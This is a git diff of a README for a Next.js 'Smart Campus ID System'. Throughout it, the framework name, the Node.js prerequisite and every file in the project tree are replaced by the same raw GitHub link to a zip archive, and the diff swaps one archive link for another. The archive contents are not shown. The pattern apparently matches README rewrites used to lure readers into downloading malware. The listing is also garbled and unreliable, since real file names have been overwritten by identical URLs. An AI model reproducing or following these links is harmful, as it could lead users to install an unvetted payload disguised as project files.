@@ -9,7 +9,7 @@ This project proposes the design and development of a Smart Campus ID System int
 ## Tech Stack
 
 ### Frontend
-- **https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip 15** - React framework with App Router
+- **https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip 15** - React framework with App Router
 - **TypeScript** - Type-safe development
 - **Tailwind CSS v4** - Modern utility-first CSS framework
 - **React Hooks** - State management
@@ -108,41 +108,41 @@ This system follows a secure, institution-controlled authentication model:
 
 ```
 app/
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                      # Landing page
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip               # Sign-in page (students/lecturers/admins)
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip # Institution registration
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip     # Account activation
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip       # Student dashboard
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip   # Lecturer dashboard
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip      # Admin dashboard
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                 # News & updates
-├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                   # Global styles
-└── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip                    # Root layout
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip                      # Landing page
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip               # Sign-in page (students/lecturers/admins)
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip # Institution registration
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip     # Account activation
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip       # Student dashboard
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip   # Lecturer dashboard
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip      # Admin dashboard
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip                 # News & updates
+├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip                   # Global styles
+└── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip                    # Root layout
 
 components/
 ├── ui/                           # Reusable UI components
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
 ├── dashboard/                    # Dashboard-specific components
-│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
-│   └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+│   ├── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
+│   └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
 └── layout/                       # Layout components
-    └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip
+    └── https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip
 ```
 
 ## Getting Started
 
 ### Prerequisites
-- https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/app/verify-email/id_smart_overexercise.zip 18+ or Bun
+- https://github.com/AndreNot3000/smart_id/raw/refs/heads/main/components/dashboard/id_smart_v2.6.zip 18+ or Bun
 - npm/yarn/pnpm/bun
 
 ### Installation
